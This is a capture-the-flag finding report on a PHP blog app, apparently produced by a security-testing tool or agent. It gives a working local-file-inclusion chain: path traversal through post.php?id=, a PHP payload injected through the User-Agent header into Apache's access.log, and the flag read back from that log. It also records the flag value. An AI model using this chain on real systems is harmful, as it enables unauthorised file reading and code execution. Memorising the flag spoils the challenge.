findings.title: CTF Flag — LFI via Log Poisoning on post.php?id= parameter
findings.description: The blog application includes arbitrary files from the server filesystem via the `id` GET parameter in post.php. The parameter is prepended with `posts/` but allows unrestricted path traversal using `../`. This enables PHP log poisoning: inject PHP code into Apache's access.log via the User-Agent header, then use LFI to include the log file and execute the injected PHP. The flag was stored at /FLAG.php (executed as PHP with no visible output), but was exfiltrated by injecting file_get_contents('/FLAG.php') via the User-Agent and reading it from the included log.
findings.evidence:
Step 1 - LFI confirmed: GET /post.php?id=../../../../var/log/apache2/access.log returned 200 with log content.

Step 2 - Log poisoning: GET / with User-Agent: <?php echo file_get_contents('/FLAG.php'); ?>

Step 3 - Flag extraction via log inclusion:
GET /post.php?id=../../../../var/log/apache2/access.log
Response included:
172.18.0.1 - [13/Apr/2026:11:58:25 +0000] "GET / HTTP/1.1" 200 2596 "-" "<?php flag{6f592559-dcf0-436c-ad0f-f0447b0444d9} ?>"

FLAG: flag{6f592559-dcf0-436c-ad0f-f0447b0444d9}
